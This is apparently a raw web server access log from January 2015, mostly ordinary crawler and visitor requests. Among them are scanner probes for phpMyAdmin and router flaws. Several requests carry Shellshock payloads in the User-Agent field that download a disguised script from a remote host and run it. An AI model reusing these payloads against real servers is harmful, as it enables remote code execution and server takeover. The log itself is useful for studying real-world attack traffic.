66.249.64.179 - - [01/Jan/2015:21:47:37 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
2.178.222.60 - - [02/Jan/2015:00:21:28 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
2.178.222.60 - - [02/Jan/2015:00:21:28 -0700] "GET /favicon.ico HTTP/1.1" 404 972 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
125.64.35.68 - - [02/Jan/2015:00:56:01 -0700] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 1006 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
66.249.64.187 - - [02/Jan/2015:01:39:47 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.183 - - [02/Jan/2015:04:34:10 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
125.64.35.67 - - [02/Jan/2015:07:36:28 -0700] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 1006 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
66.249.64.183 - - [02/Jan/2015:08:29:31 -0700] "GET /robots.txt HTTP/1.1" 404 967 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.183 - - [02/Jan/2015:08:29:31 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
62.210.136.217 - - [02/Jan/2015:09:53:45 -0700] "GET / HTTP/1.1" 200 178 "-" "-"
66.249.64.179 - - [02/Jan/2015:11:30:19 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.36 - - [02/Jan/2015:12:58:21 -0700] "GET /robots.txt HTTP/1.1" 404 962 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.179 - - [02/Jan/2015:15:26:56 -0700] "GET /index.php HTTP/1.1" 404 969 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.179 - - [02/Jan/2015:19:22:07 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
62.210.96.36 - - [02/Jan/2015:20:56:14 -0700] "GET /index.php/admissions/104-students-with-special-needs HTTP/1.1" 404 2169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
62.210.96.36 - - [02/Jan/2015:20:56:14 -0700] "GET /index.php/learning/91-a-day-in-the-life-of-primary-school HTTP/1.1" 404 2184 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
66.249.64.183 - - [02/Jan/2015:21:39:52 -0700] "GET /robots.txt HTTP/1.1" 404 967 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.183 - - [02/Jan/2015:21:39:52 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.179 - - [02/Jan/2015:22:20:01 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.183 - - [02/Jan/2015:23:15:24 -0700] "GET /index.php/about-ist HTTP/1.1" 404 977 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
104.151.231.70 - - [03/Jan/2015:03:18:49 -0700] "GET /actionnews/index/ HTTP/1.1" 404 977 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"
212.38.181.164 - - [03/Jan/2015:07:35:17 -0700] "GET / HTTP/1.0" 200 167 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
139.192.2.43 - - [03/Jan/2015:08:50:55 -0700] "GET / HTTP/1.1" 400 181 "-" "-"
66.249.64.36 - - [03/Jan/2015:09:35:49 -0700] "GET /robots.txt HTTP/1.1" 404 962 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.40 - - [03/Jan/2015:09:35:49 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.187 - - [03/Jan/2015:13:42:20 -0700] "GET /robots.txt HTTP/1.1" 404 967 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.187 - - [03/Jan/2015:13:42:20 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.187 - - [03/Jan/2015:15:42:47 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.179 - - [03/Jan/2015:18:00:10 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.187 - - [03/Jan/2015:19:57:52 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
125.64.35.68 - - [03/Jan/2015:20:19:04 -0700] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 1006 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
66.249.64.183 - - [03/Jan/2015:21:53:27 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.183 - - [04/Jan/2015:00:26:02 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
125.64.35.67 - - [04/Jan/2015:00:54:21 -0700] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 1006 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
74.91.23.52 - - [04/Jan/2015:12:57:15 -0700] "GET /blogs/ HTTP/1.0" 404 2019 "http://amirajorloo.ir/blogs/" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36"
74.91.23.52 - - [04/Jan/2015:12:57:15 -0700] "GET / HTTP/1.0" 200 167 "http://amirajorloo.ir/" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36"
182.118.55.207 - - [04/Jan/2015:14:48:04 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
74.91.23.52 - - [04/Jan/2015:15:05:44 -0700] "GET /index.php/about-ist HTTP/1.0" 404 2058 "http://amirajorloo.ir/index.php/about-ist" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 YaBrowser/14.10.2062.12061 Safari/537.36"
74.91.23.52 - - [04/Jan/2015:15:05:44 -0700] "GET / HTTP/1.0" 200 167 "http://amirajorloo.ir/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 YaBrowser/14.10.2062.12061 Safari/537.36"
66.249.69.200 - - [04/Jan/2015:15:41:40 -0700] "GET /robots.txt HTTP/1.1" 404 962 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.216 - - [04/Jan/2015:15:41:40 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
104.151.231.67 - - [04/Jan/2015:20:06:29 -0700] "GET /actionnews/index/ HTTP/1.1" 404 977 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"
66.249.69.127 - - [04/Jan/2015:21:28:50 -0700] "GET /robots.txt HTTP/1.1" 404 967 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.127 - - [04/Jan/2015:21:28:51 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
125.160.11.66 - - [05/Jan/2015:02:55:00 -0700] "GET /user/soapCaller.bs HTTP/1.1" 404 978 "-" "Morfeus Fucking Scanner"
54.162.155.8 - - [05/Jan/2015:07:52:18 -0700] "HEAD / HTTP/1.1" 200 0 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
54.162.155.8 - - [05/Jan/2015:07:52:18 -0700] "GET /clientaccesspolicy.xml HTTP/1.1" 404 2078 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
66.249.67.95 - - [05/Jan/2015:08:06:16 -0700] "GET /robots.txt HTTP/1.1" 404 967 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.95 - - [05/Jan/2015:08:06:16 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview Analytics) Chrome/27.0.1453 Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.64 - - [05/Jan/2015:12:58:22 -0700] "GET /robots.txt HTTP/1.1" 404 962 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.56 - - [05/Jan/2015:12:58:22 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
125.64.35.68 - - [05/Jan/2015:13:58:52 -0700] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 1006 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
66.249.67.103 - - [05/Jan/2015:20:56:20 -0700] "GET /robots.txt HTTP/1.1" 404 967 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.103 - - [05/Jan/2015:20:56:20 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
104.151.231.69 - - [05/Jan/2015:23:12:05 -0700] "GET /actionnews/index/ HTTP/1.1" 404 977 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"
179.99.200.39 - - [06/Jan/2015:09:40:51 -0700] "GET http://www.teddybrinkofski.com/ip_json.php HTTP/1.1" 404 979 "none" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
5.61.39.15 - - [06/Jan/2015:12:54:44 -0700] "GET / HTTP/1.1" 200 123 "http://wrenchmarks.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
95.211.168.172 - - [06/Jan/2015:13:34:45 -0700] "GET /css/css HTTP/1.0" 404 2008 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:27.C) Gecko/20130407 Firefox/27.0"
85.25.103.50 - - [06/Jan/2015:15:55:18 -0700] "GET / HTTP/1.1" 200 178 "-" "-"
85.25.103.50 - - [06/Jan/2015:15:55:22 -0700] "GET /robots.txt HTTP/1.1" 404 2042 "-" "-"
106.185.45.224 - - [06/Jan/2015:15:56:38 -0700] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 988 "-" "ByZr"
106.185.45.224 - - [06/Jan/2015:15:56:38 -0700] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 986 "-" "ByZr"
106.185.45.224 - - [06/Jan/2015:15:56:38 -0700] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 986 "-" "ByZr"
106.185.45.224 - - [06/Jan/2015:15:56:38 -0700] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 996 "-" "ByZr"
106.185.45.224 - - [06/Jan/2015:15:56:38 -0700] "GET /pma/scripts/setup.php HTTP/1.1" 404 981 "-" "ByZr"
106.185.45.224 - - [06/Jan/2015:15:56:38 -0700] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 984 "-" "ByZr"
182.118.53.179 - - [06/Jan/2015:16:11:35 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
66.249.73.192 - - [06/Jan/2015:21:08:20 -0700] "GET /robots.txt HTTP/1.1" 404 962 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.184 - - [06/Jan/2015:21:08:20 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
125.64.35.67 - - [06/Jan/2015:22:06:38 -0700] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 1006 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
212.59.240.101 - - [06/Jan/2015:23:56:12 -0700] "GET http://ec2-72-44-41-82.compute-1.amazonaws.com/proxyres.php HTTP/1.1" 404 2074 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/11.0.0"
125.64.35.68 - - [07/Jan/2015:06:01:53 -0700] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 1006 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
175.156.92.195 - - [07/Jan/2015:06:11:08 -0700] "GET /tmUnblock.cgi HTTP/1.1" 400 181 "-" "-"
5.56.63.52 - - [07/Jan/2015:07:09:23 -0700] "GET / HTTP/1.1" 200 123 "http://writermikeulmer.com" "CATExplorador/1.0beta (sistemes at domini dot cat; http://domini.cat/catexplorador.html)"
66.249.64.36 - - [07/Jan/2015:08:29:20 -0700] "GET /robots.txt HTTP/1.1" 404 962 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.32 - - [07/Jan/2015:08:29:20 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.183.166.98 - - [07/Jan/2015:08:49:02 -0700] "GET / HTTP/1.1" 200 178 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)"
217.31.48.30 - - [07/Jan/2015:15:23:26 -0700] "HEAD /rom-0 HTTP/1.1" 404 0 "-" "Python-httplib2/0.7.4 (gzip)"
66.249.64.179 - - [07/Jan/2015:20:48:17 -0700] "GET /robots.txt HTTP/1.1" 404 967 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.179 - - [07/Jan/2015:20:48:17 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
193.204.34.199 - - [08/Jan/2015:00:31:29 -0700] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 2071 "-" "() { :; }; /bin/mkdir -p /share/HDB_DATA/.../ && /usr/bin/wget -q -c http://stanislaw.altervista.org/2.php"
193.204.34.199 - - [08/Jan/2015:00:31:29 -0700] "" 400 0 "-" "-"
37.153.45.5 - - [08/Jan/2015:01:50:59 -0700] "GET /tmUnblock.cgi HTTP/1.1" 400 181 "-" "-"
107.191.51.141 - - [08/Jan/2015:04:34:04 -0700] "GET / HTTP/1.0" 200 167 "WRENCHMARKS.COM" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36"
61.135.190.69 - - [08/Jan/2015:05:19:46 -0700] "GET / HTTP/1.0" 200 167 "http://www.baidu.com/s?wd=www" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"
66.249.67.111 - - [08/Jan/2015:08:28:30 -0700] "GET /robots.txt HTTP/1.1" 404 967 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.103 - - [08/Jan/2015:08:28:30 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
182.118.53.232 - - [08/Jan/2015:16:39:03 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
66.249.67.103 - - [08/Jan/2015:20:05:43 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
125.64.35.68 - - [08/Jan/2015:21:59:55 -0700] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 1006 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
185.4.227.194 - - [08/Jan/2015:23:29:12 -0700] "GET http://24x7-allrequestsallowed.com/?PHPSESSID=1rysxtR500143PRWJTUGYDEFWB HTTP/1.1" 200 178 "-" "-"
61.135.190.71 - - [09/Jan/2015:01:23:06 -0700] "GET / HTTP/1.0" 200 167 "http://www.baidu.com/s?wd=www" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"
125.64.35.67 - - [09/Jan/2015:01:30:05 -0700] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 1006 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
66.249.67.64 - - [09/Jan/2015:08:08:31 -0700] "GET /robots.txt HTTP/1.1" 404 962 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.64 - - [09/Jan/2015:08:08:31 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
109.111.142.223 - - [09/Jan/2015:08:58:03 -0700] "GET / HTTP/1.1" 200 178 "-" "-"
91.238.134.99 - - [09/Jan/2015:13:44:52 -0700] "GET http://pl.wikipedia.org/wiki/Special:Search?search=&go=Go HTTP/1.1" 404 2090 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
61.135.190.72 - - [09/Jan/2015:19:54:17 -0700] "GET / HTTP/1.0" 200 167 "http://www.baidu.com/s?wd=www" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"
66.249.67.64 - - [09/Jan/2015:19:58:37 -0700] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
89.19.7.66 - - [10/Jan/2015:04:51:04 -0700] "GET HTTP/1.1 HTTP/1.1" 400 181 "-" "-"
89.19.7.66 - - [10/Jan/2015:04:51:04 -0700] "GET / HTTP/1.1" 200 123 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:04 -0700] "GET /cgi-bin/bash HTTP/1.1" 404 975 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:05 -0700] "GET /cgi-bin/contact.cgi HTTP/1.1" 404 980 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:05 -0700] "GET /cgi-bin/defaultwebpage.cgi HTTP/1.1" 404 987 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:05 -0700] "GET /cgi-bin/env.cgi HTTP/1.1" 404 977 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:06 -0700] "GET /cgi-bin/fire.cgi HTTP/1.1" 404 977 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:06 -0700] "GET /cgi-bin/forum.cgi HTTP/1.1" 404 978 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:06 -0700] "GET /cgi-bin/hello.cgi HTTP/1.1" 404 979 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:07 -0700] "GET /cgi-bin/index.cgi HTTP/1.1" 404 978 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:07 -0700] "GET /cgi-bin/login.cgi HTTP/1.1" 404 978 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:07 -0700] "GET /cgi-bin/main.cgi HTTP/1.1" 404 978 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:08 -0700] "GET /cgi-bin/meme.cgi HTTP/1.1" 404 977 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
89.19.7.66 - - [10/Jan/2015:04:51:08 -0700] "GET /cgi-bin/php HTTP/1.1" 404 974 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://61.218.226.170/~fff/eCo.jpg -O /tmp/eCo.jpg;curl -O /tmp/eCo.jpg http://61.218.226.170/~fff/eCo.jpg;perl /tmp/eCo.jpg;rm -rf /tmp/eCo.jpg*\x22);'"
